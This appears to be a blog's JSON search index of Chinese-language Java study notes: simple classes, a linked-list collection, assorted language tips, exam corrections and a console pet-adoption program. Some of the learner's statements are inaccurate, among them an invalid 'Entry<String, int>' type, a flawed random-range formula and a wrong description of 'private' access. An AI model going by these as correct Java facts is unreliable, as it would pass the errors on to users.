ArrayUtil &#123; public static void printArray(int ... date) &#123;// 依旧等价于 int[] date for(int x : date) &#123; System.out.print(x + &quot; &quot;); &#125; System.out.println(); &#125;&#125;public class Product&#123; public static void main(String[] args) &#123; ArrayUtil.printArray(new int[]&#123;1, 2, 3, 4&#125;) ; ArrayUtil.printArray(1, 2, 3, 4, 5) ; &#125;&#125;/*** 1 2 3 4* 1 2 3 4 5**/","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"面向对象案例分析","date":"2021-11-06T03:50:30.000Z","path":"2021/11/06/2021.11.06 面向对象案例/","text":"初期最简单并且最为可靠的分析，就是：简单 java 类！ # Adress 类 编写一个地址类，要求包含国家、省份、城市、街道、邮政编码； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182package com.test01;class Adress &#123; private String country; private String provice; private String city; private String street; private String zipcode; // builtter public Adress() &#123; this(null, null, null, null, null) ; &#125; public Adress(String country) &#123; this(country, null, null, null, null) ; &#125; public Adress(String country, String provice) &#123; this(country, provice, null, null, null) ; &#125; public Adress(String country, String provice, String city) &#123; this(country, provice, city, null, null) ; &#125; public Adress(String country, String provice, String city, String street) &#123; this(country, provice, city, street, null) ; &#125; public Adress(String country, String provice, String city, String street, String zipCode) &#123; setCountry(country) ; setProvice(provice) ; setCity(city) ; setStreet(street) ; setZipCode(zipCode) ; &#125; // setter public void setCountry(String country) &#123; this.country = country ; &#125; public void setProvice(String provice) &#123; this.provice = provice ; &#125; public void setCity(String city) &#123; this.city = city ; &#125; public void setStreet(String street) &#123; this.street = street ; &#125; public void setZipCode(String zipcode) &#123; this.zipcode = zipcode ; &#125; // getter public String getCountry() &#123; return this.country ; &#125; public String getProvice() &#123; return this.provice ; &#125; public String getCity() &#123; return this.city ; &#125; public String getStreet() &#123; return this.street ; &#125; public String getZipcode() &#123; return this.zipcode ; &#125; public String getInfo() &#123; return this.country + this.provice + this.city + this.street + this.zipcode ; &#125;&#125;public class Test &#123; public static void main(String[] args) &#123; System.out.println(new Adress(&quot;中国&quot;, &quot;湖南省&quot; , &quot;邵阳市&quot;, &quot;新华街&quot;, &quot;422718&quot;).getInfo()) ; &#125;&#125;// 中国湖南省邵阳市新华街422718// 简单java类，有意义名称，属性构造，setter,getter,builtter，无输出。 Employee定义并测试一个代表员工的 Employee 类。员工属性包括编号、姓名、基本薪水、薪水增长速率，还包括计算薪水增长额，增长后的工资总额的操作方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Employee &#123; private long empno ; private String ename ; private double salary ; private double rate ; public Employee() &#123;&#125; public Employee(long empno, String name, double salary, double rate) &#123; this.empno = empno ; this.ename = name ; this.salary = salary ; this.rate = rate ; &#125; public double salaryIncValue() &#123; return this.salary * this.rate ; &#125; public double salaryIncResult() &#123; this.salary *= (1 + this.rate) ; return this.salary ; &#125; public String getInfo() &#123; return &quot;员工编号&quot; + this.empno + &quot;，姓名：&quot; + this.ename + &quot;，工资&quot; + this.salary + &quot;，工资增长速率&quot; + this.rate ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Employee emp = new Employee(10001, &quot;方宁&quot; , 3000, 0.3) ; System.out.println(emp.getInfo()) ; System.out.println(&quot;调整资薪额度：&quot; + emp.salaryIncValue() ) ; System.out.println(&quot;调整资薪结果：&quot; + emp.salaryIncResult() ) ; System.out.println(emp.getInfo()) ; &#125;&#125;/**员工编号10001，姓名：方宁，工资3000.0，工资增长速率0.3调整资薪额度：900.0调整资薪结果：3900.0员工编号10001，姓名：方宁，工资3900.0，工资增长速率0.3**/ User定义一个用户类，要求包含用户名、用户密码，以及用户数量。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051class User &#123; private String uid ; private long password ; public static int count ; static &#123; count = 0; &#125; // 构造 public User() &#123; this(&quot;NOID&quot; , 123456) ; &#125; public User(String name) &#123; this(name, 123456) ; &#125; public User(String name, long password) &#123; this.uid = name ; this.password = password ; count ++ ; &#125; public static int getCount() &#123; return count ; &#125; public String getInfo() &#123; return &quot;用户名：&quot; + this.uid + &quot;, 用户密码&quot; + this.password; &#125; &#125;public class Test &#123; static&#123; System.out.println(&quot;**********用户管理系统**********&quot;) ; &#125; public static void main(String[] args) &#123; User user1 = new User() ; User user2 = new User(&quot;方宁&quot;) ; User user3 = new User(&quot;方宁&quot;, 666666 ) ; System.out.println(user1.getInfo()) ; System.out.println(user2.getInfo()) ; System.out.println(user3.getInfo()) ; System.out.println(&quot;用户数量：&quot; + User.count) ; &#125;&#125;/************用户管理系统**********用户名：NOID, 用户密码123456用户名：方宁, 用户密码123456用户名：方宁, 用户密码666666用户数量：3**/ Book声明一个 book 类，要求成员为书名、编号（利用静态变量实现自动编号）、书价、并拥有静态数据成员册数（记录图书册数）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class Book &#123; private String name ; private long id ; private double price ; private static long bookID ; private static int count ; static &#123; bookID = 1000000 ; count = 0 ; &#125; public Book() &#123; this(null , 0.0) ; &#125; public Book(String name) &#123; this(name, 0.0) ; &#125; public Book(String name, double price) &#123; this.name = name ; this.price = price ; this.id = ++bookID ; count ++ ; &#125; public static int getCount() &#123; return count ; &#125; public String getInfo() &#123; return &quot;书名&quot; + this.name + &quot;，书ID:&quot; + this.id + &quot;，书价格：&quot; + this.price ; &#125; &#125;public class Hello &#123; public static void main(String[] args) &#123; Book book1 = new Book() ; Book book2 = new Book(&quot;java&quot;) ; Book book3 = new Book(&quot;MySQL&quot;, 12.00) ; System.out.println(book1.getInfo()) ; System.out.println(book2.getInfo()) ; System.out.println(book3.getInfo()) ; System.out.println(Book.getCount()) ; &#125;&#125;/**书名null，书ID:1000001，书价格：0.0书名java，书ID:1000002，书价格：0.0书名MySQL，书ID:1000003，书价格：12.03**/","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"java零碎知识点","date":"2021-11-06T02:00:30.000Z","path":"2021/11/06/2021.11.06 java零碎知识点/","text":"常用 java API1234import java.util.Scanner ; // 提供表标准输入流 util = utilities 实用工具import java.lang.* ; // 最核心的类import java.lang.Math ; // 提供 max(), min(), random()等数学静态方法import java.util.Arrays; // 提供 Arrays.sort(), 静态排序方法 模拟一个集合容器功能对整形数据进行存储，提供增、删、查、改功能； 收获java 中的参考名称（引用名称）就是 C 语言里面的指针！，引用里面存储的就是实例化对象的地址！ 可以像 C 中一样，使用指针实现链表。定义一个 Node 类，然后链表的建立集合。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190package com.test01 ;import java.util.Scanner;/* * 功能： * 提供一个集合方法，可以进行数据的增删查改； * 方法： * int getSize()：返回当前集合大小； * void getInfo()：输出集合中所有元素； * void add(int)：向集合中添加元素； * void delete(int)：向集合中删除元素； * void change(int x, int y)：将集合中x替换成y； * int find(int)：查找元素，并返回所在集合中的位置； * */class Node &#123; int date ; Node nextNode = null ; // 构造 public Node(int x) &#123; this.date = x ; &#125; // 属性都公开算了，为了方便直接访问。&#125;class Array &#123; private int size; private Node headNode; public Array() &#123; this.size = 0 ; this.headNode = null ; &#125; public void add(int x) &#123; Node addNode = new Node(x) ; Node cur = this.headNode ; Node pre = null ; while(cur != null) &#123; pre = cur ; cur = cur.nextNode ; &#125; if(this.size == 0) this.headNode = addNode ; else &#123; pre.nextNode = addNode ; &#125; this.size++ ; &#125; // 查找，返回下标，或者 0 public int find(int x) &#123; if(this.size == 0) return 0 ; else &#123; int pos = 1 ; Node cur = this.headNode; while(cur != null) &#123; if(cur.date == x) return pos ; else &#123; cur = cur.nextNode ; pos++ ; &#125; &#125; return 0 ; &#125; &#125; public void delete(int x) &#123; if(this.size != 0) &#123; Node pre = null ; Node cur = this.headNode ; boolean first = true ; while(cur != null) &#123; if(cur.date == x) &#123; if(first) &#123; this.headNode = cur.nextNode ; cur = cur.nextNode ; this.size-- ; continue ; &#125;else &#123; pre.nextNode = cur.nextNode ; cur = cur.nextNode; this.size-- ; &#125; &#125;else &#123; pre = cur ; cur = cur.nextNode ; &#125; first = false; &#125; &#125; &#125; public void change(int a, int b) &#123; Node cur = this.headNode ; while(cur != null) &#123; if(cur.date == a) &#123; cur.date = b ; &#125; cur = cur.nextNode ; &#125; &#125; public int getSize() &#123; return this.size ; &#125; public void clear() &#123; this.size = 0 ; this.headNode = null ; &#125; public void getInfo() &#123; Node cur = this.headNode ; while(cur != null) &#123; System.out.printf(cur.date + &quot; &quot;) ; cur = cur.nextNode ; &#125; System.out.println() ; &#125; &#125;public class HomeWork &#123; static &#123; System.out.println(&quot;*********** 测试程序 ***********&quot;) ; System.out.println(&quot;功能：实现一个集合的增删改查。&quot;) ; System.out.println() ; System.out.println(&quot;************主菜单*************&quot;) ; System.out.println(&quot;添加指令：add x&quot;) ; System.out.println(&quot;删除指令：del x&quot;) ; System.out.println(&quot;查找指令：find x&quot;) ; System.out.println(&quot;修改指令：change x y&quot;) ; System.out.println(&quot;打印所有：print&quot;) ; System.out.println(&quot;显示个数：size&quot;) ; System.out.println() ; &#125; public static void work(Array ary) &#123; Scanner sc = new Scanner(System.in) ; System.out.println(&quot;请输入指令：&quot;); int x ; while(sc.hasNext()) &#123; String order = sc.next() ; switch(order)&#123; case &quot;add&quot; : x = sc.nextInt() ; ary.add(x) ; break ; case &quot;del&quot; : x = sc.nextInt() ; ary.delete(x) ; break ; case &quot;find&quot; : int result = ary.find( sc.nextInt() ); if(result &gt;= 1) System.out.println(&quot;数据在第&quot; + result + &quot;个位置&quot;) ; else System.err.println(&quot;查无此数据！&quot;) ; break ; case &quot;change&quot; : int y ; x = sc.nextInt() ; y = sc.nextInt() ; if(ary.find(x) &gt;= 1) ary.change(x, y) ; else System.err.println(&quot;不存在数据：&quot; + x) ; break ; case &quot;print&quot; : ary.getInfo() ; break ; case &quot;size&quot; : System.out.println(&quot;当前数组元素个数：&quot; + ary.getSize()) ; break ; default : System.err.println(&quot;输入有误，请重新输入！&quot;) ; &#125; System.out.println(&quot;继续请输入指令，结束请按ctrl + Z!&quot;) ; System.out.println() ; &#125; sc.close() ; &#125; public static void main(String[] args) &#123; Array ary = new Array() ; work(ary) ; &#125;&#125; 生产任意区间[a,b] 的随机数使用 Math 类提供的静态方法 random() 生成 0-1 的随机数； 下限 + 随机数 % (区间长度) 即可生成区间随机数。 1System.out.println( a + (int)(Math.random()*b) % (b-a+1) ); 关于字符串连接 使用 ‘+’ 号连接字符串和非字符串时，非字符串会自动转化成字符串。 a + b + &quot;string&quot; + c 该运算从左到右，先将 a , b 相加，然后将结果转化为字符串和 string 以及 c 相连。 关于 switchswitch 不支持 long，double，float，boolean；支持 String。 case [字面量、常量] : case 语句后面不能加变量！ 支持 byte、short、int、char、String、enum。 关于输出System.err.out 一般可用来输出错误信息，和标准输出System.out.println 不同属一个线程，所以具有异步性，无法控制输出顺序！ 关于位移运算符 位移运算平常可以用于乘除！ &lt;&lt; , &gt;&gt; 左移乘2，右移除2； 符号位保持不变，是修改后的位移运算。 “ &lt;&lt;&lt; ， &gt;&gt;&gt;” 真正的二进制移位，不进行符号修改； 如果是-1，右移变成正最大。 关于 breakbreak [标记] break 后面可以加标记参数，可以跳转到多层循环外部，只需要添加标记即可，用法同 C 中的 goto 123456g:for(int i = 0; i &lt; 100; i++) &#123; for(int j = 0; j &lt; 100; j++)&#123; for(int k = 0; k &lt; 100; k++) break g; // 直接跳出外出到 g 标记处！ &#125;&#125; 关于访问修饰符 修饰符 访问范围 public 本项目，所有类（包内，包外） protect 包内所有类，包外的子类（继承） 无 包内所用类，包外不可 private 仅仅包内，且本类中进行直接访问 第一次考试错题1234567891011121. java数据类型：只写了基本数据类型，没写引用数据类型分类。2. JDK包含JRE，JRE包含JVM。JVM中执行.class java程序。3. 高精度转低精度，大范围转小范围的数据类型，需要强制转化。 * 其他情况，高要求到低要求的，自动转换。 4. break 是打断当前语句块，而不仅仅是循环体，因为 switch 也可以使用 break。5. +=，-= 自动进行强制转换，float f = 3.14f；float定义，需要加f。6. 数组是 .length 属性；字符串是 .length() 方法。 第二次考试错题12345678910111. 如何一行代码实现交换两个a, b两个数： a = (a+b)-(b=a); 2. 逆置一个字符串，不需要找到中点，直接 while 双端指针满足条件就行了。3. 接口和抽象类的区别：从定义关键字，属性修饰符，可以拥有的成员类型，能否有构造，继承实现关键字，一对一，一对多继承关系等回答。4. HashMap的建立，遍历： 添加数据使用 put() 方法；遍历的时候，迭代器也需要声明为相应类型，Entry&lt;String, int&gt; e；5. Object 和 泛型虽然有类似点，都可以接收任意数据类型，都是仍然有本质区别：Object传进来是上转后的对象，无法使用子类方法，泛型声明的时候只是一个空指代，运行时传入的是对象本身，可以使用子类方法。 宠物小店程序功能 程序运行进入登陆界面，账号密码定义为常量； 只有账号，密码正确才能进行程序。 提示账号错误，还是密码错误。 三次账号，密码错误停止执行。 用户进店，可以选择至少三种可领养的宠物，或者选择上次领养的宠物。 宠物需要有：姓名、性别、年龄、心情、体力、健康、亲密度。 值不能为负，最高100； 性别只有公、母。 选择完宠物，需要选择进行的操作 玩耍 喂食 治疗 查看属性 退出 玩耍要求有多个游戏项目，每个游戏项目可以增加不同的宠物心情，亲密度，消耗体力； 体力过低不能进行玩耍。 喂食同样要求提供不同方案，每个不同方案，增加不同的体力值。 健康度过低，不能进行喂食。 喂食过程中可能发生食物中毒，导致健康度降低。 超过上限100，不允许进行喂食。 治疗需要根据动物的不同，提供不同的治疗方案，增加不同的健康度。 超过上限，不允许进行治疗。 查看属性可以输出宠物当前所有属性。 退出程序，需要保存当前领养的宠物数据到本地。 所有的控制台输入都要进行判断，输入不合法不影响程序执行，输出相应错误提示。 类 Main：程序入口 Animal：定义宠物种类 Console：实现屏幕内容交互 Play：玩耍 Feed：喂食 Treat：治疗 工具类 FileUtil：文件读写功能 JudgeInput：用户输入正确判断 RatUtil：随机事件发生 接口 FinalVariable：常量池接口 思路 主方法只进行用户首次提示，主要操作放到 Console 方法中。 Console 方法初始化各种动物，提供给用户选择。提供用户登陆判断、主菜单生成、活动菜单生成等界面的打印功能。 Animal类表示宠物种类，Play、Feed、Treat分别对应三个操作。 FileUtil提供将宠物对象，转化为字符串信息，存储到本地；将本地信息读取出来，生成宠物对象，进行返回。 JudgeInput提供判断用户输入是否合法，如果不合法返回 -1，合法，返回输入值。 RatUtil 按照设置的概率，随机生成是否产生食物中毒的情况。 FinalVariable 接口用来作为常量存放接口，所用常量放到这里。 代码 Main 12345678910111213141516171819202122package home.pets;import java.util.Scanner ;public class Main &#123; public static void main(String[] args) &#123; Scanner sc = new Scanner(System.in) ; Console console = new Console() ; // 登录界面 if( !console.judgeID(sc) ) return; // 领养界面 console.printStarMenu() ; int op = JudgeInput.judge(sc.nextLine() , 0, console.pets.length) ; if(op &gt;= 0) Console.petIndex = op ; // 活动界面 console.printActivityMenu(sc) ; sc.close(); &#125;&#125; Animal 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package home.pets;class Animal &#123; private String name ; private String sex ; private int age ; private int moodVal ; private int physicalVal ; private int healthVal ; private double closeVal ; public Animal() &#123;&#125; public Animal(String name, String sex, int age, int moodVal, int physicalVal, int healthVal, double closeVal) &#123; this.setName(name) ; this.setAge(age) ; this.setSex(sex) ; this.setMoodVal(moodVal) ; this.setPhysicalVal(physicalVal) ; this.setHealthVal(healthVal) ; this.setCloseVal(closeVal) ; &#125; // setter public void setName(String name) &#123; this.name = name ; &#125; public void setSex(String sex) &#123; if(sex.equals(&quot;公&quot;) || sex.equals(&quot;母&quot;)) this.sex = sex ; else this.sex = null ; &#125; public void setAge(int age) &#123; this.age = age ; &#125; public void setMoodVal(int moodVal) &#123; this.moodVal = (moodVal &gt; 100) ? 100 : (moodVal &gt; 0) ? moodVal : 0 ; &#125; public void setPhysicalVal(int physicalVal) &#123; this.physicalVal = (physicalVal &gt; 100) ? 100 : (physicalVal &gt; 0) ? physicalVal : 0 ; &#125; public void setHealthVal(int healthVal) &#123; this.healthVal = (healthVal &gt; 100) ? 100 : (healthVal &gt; 0) ? healthVal : 0 ; &#125; public void setCloseVal(double closeVal) &#123; this.closeVal = (closeVal &gt; 100) ? 100 : (closeVal &gt; 0) ? closeVal : 0 ; &#125; // getter public String getName() &#123; return this.name ; &#125; public String getSex() &#123; return this.sex ; &#125; public int getAge() &#123; return this.age ; &#125; public int getMoodVal() &#123; return this.moodVal ; &#125; public int getPhysicalVal() &#123; return this.physicalVal ; &#125; public int getHealthVal() &#123; return this.healthVal ; &#125; public double getCloseVal() &#123; return this.closeVal ; &#125; public void play() &#123;&#125; public void eat() &#123;&#125; public void recover() &#123;&#125; public String getInfo() &#123; return &quot;宠物名：&quot; + this.name + &quot;；性别：&quot; + this.sex + &quot;；年龄：&quot; + this.age + &quot;；心情值：&quot; + this.moodVal + &quot;；当前体力：&quot; + this.physicalVal + &quot;；健康度：&quot; + this.healthVal + &quot;；亲密值：&quot; + this.closeVal ; &#125; public String toString() &#123; return this.name + &quot; &quot; + this.sex + &quot; &quot; + this.age + &quot; &quot; + this.moodVal + &quot; &quot; + this.physicalVal + &quot; &quot; + this.healthVal + &quot; &quot; + this.closeVal ; &#125;&#125; Console 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129package home.pets;import java.util.Scanner ;class Console &#123; public Animal[] pets ; public static int petIndex ; static &#123; System.out.println(&quot;*********** 欢迎观临有良宠物综合乐园 ***********&quot;) ; &#125; public Console() &#123; // 品种，性别，年龄，心情，体力，健康，亲密 pets = new Animal[] &#123; new Animal(&quot;猫&quot;, &quot;母&quot;, 1, 60, 70, 90, 0.0) , new Animal(&quot;狗&quot;, &quot;公&quot;, 2, 70, 100, 98, 0.5) , new Animal(&quot;猪&quot;, &quot;母&quot;, 1, 60, 60, 70, 0.0) , new FileUtil().getPetDate() &#125; ; &#125; public Console(Animal ... pets) &#123; this.pets = pets ; &#125; public boolean judgeID(Scanner sc) &#123; System.out.println(&quot;请输入账号，密码：&quot;) ; int t = 0 ; while(true) &#123; t++ ; if(t == 4) return false ; System.out.printf(&quot;账号：&quot;) ; String account = sc.nextLine() ; System.out.printf(&quot;密码：&quot;) ; String password = sc.nextLine() ; if(!FinalVariable.ACCOUNT.equals(account)) &#123; System.out.println(&quot;账号错误请重试！还剩&quot; + (3-t) + &quot;次机会&quot;) ; continue ; &#125;else if(!FinalVariable.PASSWORD.equals(password)) &#123; System.out.println(&quot;密码错误请重试！还剩&quot; + (3-t) + &quot;次机会&quot;) ; continue ; &#125;else &#123; return true ; &#125; &#125; &#125; public void printStarMenu() &#123; System.out.println(&quot;********** 请输入需要领养的灵宠 **********&quot;) ; System.out.println(&quot;其他键退出！&quot;) ; int i; for( i = 0; i &lt; this.pets.length-1; i++ ) &#123; System.out.println(&quot;\\t&quot; + i + &quot;：&quot; + pets[i].getName()) ; &#125; System.out.println(&quot;\\t&quot; + i + &quot;：继续上次的宠物。\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n&quot;) ; &#125; public void printActivityMenu(Scanner sc) &#123; System.out.println(&quot;************** 人、宠活动乐园 *******************&quot;) ; System.out.println(&quot;您可以和您的宠物，进行如下活动：&quot;) ; System.out.println(&quot;1，玩耍\\n2，喂食\\n3，治疗\\n4，查看属性\\n5，退出\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n&quot;) ; int op = JudgeInput.judge(sc.nextLine(), 1, 5) ; if(op != -1) this.work(this.pets[petIndex], op, sc); else &#123; System.out.println(&quot;输入有误，重新输入！&quot;) ; this.printActivityMenu(sc); &#125; &#125; public void work(Animal pet, int choose, Scanner sc) &#123; int op ; switch(choose) &#123; case 1: if(pet.getPhysicalVal() &lt; 60) &#123; System.out.println(&quot;抱歉您的宠物体力值过低，不能进行游戏！&quot;) ; break ; &#125; Play game = new Play(pet) ; game.getGameOptions(); op = JudgeInput.judge(sc.nextLine(), 1, game.games.length) ; if( op != -1 ) game.startGame(op); break ; case 2: if(pet.getHealthVal() &lt; 40) &#123; System.out.println(&quot;抱歉您的宠物健康状况很糟糕，需要及时进行治疗！&quot;) ; break ; &#125; Feed feed = new Feed(pet) ; feed.getFeedOptions() ; op = JudgeInput.judge(sc.nextLine(), 1, feed.foods.length) ; if(op != -1) feed.startFeed(op) ; break ; case 3: if(pet.getHealthVal() == 100) &#123; System.out.println(&quot;抱歉您的宠物已是最佳状态，不需要进行治疗喔！&quot;) ; break; &#125; Treat treat = new Treat(pet) ; treat.getTreatOptions(); op = JudgeInput.judge(sc.nextLine(), 1, treat.options.length) ; if(op != -1) treat.startTreat(op); break ; case 4: System.out.println(pet.getInfo()) ; break ; case 5: new FileUtil().savePetDate(pet) ; return; default: System.out.println(&quot;输入有误，请重新输入！&quot;) ; &#125; this.printActivityMenu(sc); &#125;&#125; Play 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394package home.pets;class Game &#123; private String name ; private int upMoodVal ; private double upCloseVal ; private int reducePhysicalVal ; public Game() &#123;&#125; public Game(String name, int upMoodVal, double upCloseVal, int reducePhysicalVal) &#123; this.name = name ; this.upMoodVal = upMoodVal ; this.upCloseVal = upCloseVal ; this.reducePhysicalVal = reducePhysicalVal ; &#125; public String getName() &#123; return this.name ; &#125; public int getUpMoodVal() &#123; return this.upMoodVal ; &#125; public double getUpCloseVal() &#123; return this.upCloseVal ; &#125; public int getReducePhysicalVal() &#123; return this.reducePhysicalVal ; &#125; public String toString() &#123; return &quot;【游戏名】：&quot; + this.name + &quot;；【增加心情点】：&quot; + this.upMoodVal + &quot;；【增加亲密度】：&quot; + this.upCloseVal + &quot;；【减少体力】：&quot; + this.reducePhysicalVal ; &#125;&#125;public class Play &#123; private Animal pet ; public Game[] games ; public Play() &#123;&#125; public Play(Animal pet) &#123; this.setGame(pet) ; &#125; public void setGame(Animal pet) &#123; this.pet = pet ; switch(pet.getName()) &#123; case &quot;猫&quot;: this.games = new Game[] &#123; new Game(&quot;猫薄荷&quot;, 30, 10.0, -5) , new Game(&quot;逗猫棒&quot;, 10, 6.0, -15) , new Game(&quot;梳毛&quot;, 15, 5.0, -10) &#125; ; break ; case &quot;狗&quot;: this.games = new Game[] &#123; new Game(&quot;遛狗&quot;, 25, 10.0, -15) , new Game(&quot;接飞盘&quot;, 20, 5.0, -30) , new Game(&quot;接皮球&quot;, 10, 7.0, -20) &#125; ; break ; case &quot;猪&quot;: this.games = new Game[] &#123; new Game(&quot;睡眠&quot;, 25, 10.0, -1) , new Game(&quot;散步&quot;, 15, 5.0, -15) , new Game(&quot;斗猪&quot;, 10, 3.0, -30) , &#125; ; break ; default: this.games = null ; &#125; &#125; public void getGameOptions() &#123; System.out.println(&quot;请选择游戏选项，其他键退出：&quot;) ; for(int i = 1; i-1 &lt; this.games.length; i++) &#123; System.out.println(&quot;\\t&quot; + i + &quot;: &quot; + this.games[i-1].toString()) ; &#125; System.out.println(&quot;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n&quot;); &#125; public void startGame(int select) &#123; this.pet.setMoodVal( this.pet.getMoodVal() + this.games[select-1].getUpMoodVal() ) ; this.pet.setCloseVal( this.pet.getCloseVal() + this.games[select-1].getUpCloseVal() ) ; this.pet.setPhysicalVal( this.pet.getPhysicalVal() + this.games[select-1].getReducePhysicalVal() ) ; System.out.println(&quot;游戏结束了！您的宠物获得以下经验点：&quot;) ; System.out.println( &quot;\\t|-心情点增加：&quot; + this.games[select-1].getUpMoodVal() ) ; System.out.println( &quot;\\t|-亲密度增加：&quot; + this.games[select-1].getUpCloseVal() ) ; System.out.println( &quot;\\t|-体力值减少：&quot; + this.games[select-1].getReducePhysicalVal() ) ; &#125; public String toString() &#123; return this.pet.getName() + &quot;正在进行游戏...&quot; ; &#125;&#125; Feed 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394package home.pets;class Food &#123; private String name ; private int recoverVal ; private int reduceVal ; private String reasonMsg ; public Food() &#123;&#125; public Food(String name, int value, int reduce, String msg) &#123; this.name = name ; this.recoverVal = value ; this.reduceVal = reduce ; this.reasonMsg = msg ; &#125; // setter 用不到，实例后属性固定。 public String getName() &#123; return this.name ; &#125; public int getRecoverVal() &#123; return this.recoverVal ; &#125; public int getReduceVal() &#123; return this.reduceVal ; &#125; public String getReasonMsg() &#123; return this.reasonMsg ; &#125; public String toString() &#123; return &quot;【食物种类】：&quot; + this.name + &quot;、【增加体力数】：&quot; + this.recoverVal + &quot;\\n\\t\\t注意：可能&quot; + this.reasonMsg + &quot;而造成食物中毒&quot; + &quot;、【食物中毒伤害】：&quot; + this.reduceVal; &#125;&#125;class Feed &#123; private Animal animal ; public Food[] foods ; public Feed() &#123;&#125; public Feed(Animal animal) &#123; this.setAnimal(animal) ; &#125; public void setAnimal(Animal animal) &#123; this.animal = animal ; switch(animal.getName()) &#123; case &quot;猫&quot;: foods = new Food[] &#123; new Food(&quot;猫粮&quot;, 10, -5, &quot;猫粮过期&quot;) , new Food(&quot;鱼&quot;, 15, -10, &quot;鱼刺卡喉&quot;) , new Food(&quot;米饭&quot;, 5, -8, &quot;米饭馊了&quot;) &#125; ; break ; case &quot;狗&quot;: foods = new Food[] &#123; new Food(&quot;肉&quot;, 20, -10, &quot;肉质变质&quot;) , new Food(&quot;米饭&quot;, 15, -6, &quot;米饭馊了&quot;) , new Food(&quot;屎&quot;, 3, -20, &quot;被恶心到&quot;) &#125; ; break ; case &quot;猪&quot;: foods = new Food[] &#123; new Food(&quot;白菜&quot;, 15, -20, &quot;农药污染&quot;) , new Food(&quot;米饭&quot;, 10, -10, &quot;米饭馊了&quot;) , new Food(&quot;水&quot;, 5, -10, &quot;水质污染&quot;) &#125; ; break ; default: foods = null ; &#125; &#125; public void getFeedOptions() &#123; System.out.println(&quot;请输入整数选择喂食方案，其他键退出：&quot;) ; for(int i = 1; i-1 &lt; this.foods.length; i++) &#123; System.out.println(&quot;\\t&quot; + i + &quot;: &quot; + this.foods[i-1].toString()) ; &#125; System.out.println(&quot;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n&quot;); &#125; public void startFeed(int select) &#123; if(RatUtil.isHappen()) &#123; this.animal.setHealthVal( this.animal.getHealthVal() + this.foods[select-1].getReduceVal() ) ; System.out.println(&quot;糟糕了，喂食时发生&quot; + this.foods[select-1].getReasonMsg() + &quot;，您的宠物中毒啦！&quot;) ; &#125;else &#123; this.animal.setPhysicalVal( this.animal.getPhysicalVal() + this.foods[select-1].getRecoverVal() ) ; System.out.println( &quot;喂食成功！宠物体力值增加了：&quot; + this.foods[select-1].getRecoverVal() ) ; &#125; &#125; public String toString() &#123; return this.animal.getName() + &quot;正在进行喂食...&quot; ; &#125;&#125; Treat 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package home.pets;/** * * @author 方宁 * 治疗方案类，只有治疗名称，和治疗效果值属性。 * 只在 treat 治疗类中，被自动构造。 */class Option &#123; private String name ; private int recoverVal ; public Option() &#123;&#125; public Option(String name, int recoverVal) &#123; this.name = name ; this.recoverVal = recoverVal ; &#125; public void setName(String name) &#123; this.name = name ; &#125; public void setRecoverVal(int val) &#123; this.recoverVal = val ; &#125; public String getName() &#123; return this.name ; &#125; public int getRecoverVal() &#123; return this.recoverVal ; &#125; public String toString() &#123; return &quot;【治疗方案】：&quot; + this.name + &quot;【恢复值】：&quot; + this.recoverVal ; &#125;&#125;/** * * @author 方宁 * 治疗类 * 根据传入的动物类别不同，初始化不同的治疗方案； * 提供分配的治疗方案值； * 并且根据传入的选择，修改宠物健康值。 */public class Treat &#123; private Animal animal ; public Option[] options ; public Treat() &#123;&#125; public Treat(Animal animal) &#123; this.setAnimal(animal) ; &#125; public void setAnimal(Animal animal) &#123; this.animal = animal ; this.setOption(animal) ; &#125; private void setOption(Animal animal) &#123; switch(animal.getName()) &#123; case &quot;猫&quot; : this.options = new Option[]&#123; new Option(&quot;撸猫&quot;, 5) , new Option(&quot;打针&quot;, 15) , new Option(&quot;喂药&quot;, 10) &#125; ; break ; case &quot;狗&quot; : this.options = new Option[]&#123; new Option(&quot;阉割&quot;, 5) , new Option(&quot;洗澡&quot;, 10) , new Option(&quot;手术&quot;, 20) &#125; ; break ; case &quot;猪&quot; : this.options = new Option[]&#123; new Option(&quot;休息&quot;, 15) , new Option(&quot;按摩&quot;, 20) , new Option(&quot;喂药&quot;, 10) &#125; ; break ; default : this.options = null ; &#125; &#125; public void getTreatOptions() &#123; System.out.println(&quot;请选择治疗方案，其他键退出：&quot;) ; for(int i = 1; i-1 &lt; this.options.length; i++) &#123; System.out.println(&quot;\\t&quot; + i + &quot;: &quot; + this.options[i-1].toString()) ; &#125; System.out.println(&quot;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n&quot;); &#125; public void startTreat(int select) &#123; this.animal.setHealthVal( this.animal.getHealthVal() + this.options[select-1].getRecoverVal() ) ; System.out.println(&quot;治疗成功！当前您的宠物健康值：&quot; + this.animal.getHealthVal()) ; &#125; public String toString() &#123; return this.animal.getName() + &quot;正在接受治疗...&quot; ; &#125;&#125; FileUtil 